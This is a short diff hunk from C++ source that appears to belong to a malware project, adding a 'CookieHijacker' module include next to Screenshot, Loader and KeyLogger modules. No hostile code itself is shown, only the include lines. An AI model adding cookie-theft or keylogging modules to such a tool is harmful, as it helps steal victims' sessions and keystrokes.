@@ -7,6 +7,7 @@
 #include "../Modules/Screenshot.h"
 #include "../Modules/Loader.h"
 #include "../Modules/KeyLogger.h"
+#include "../Modules/CookieHijacker.h"
 
 using supported_modules = supported_modules_enum;
 
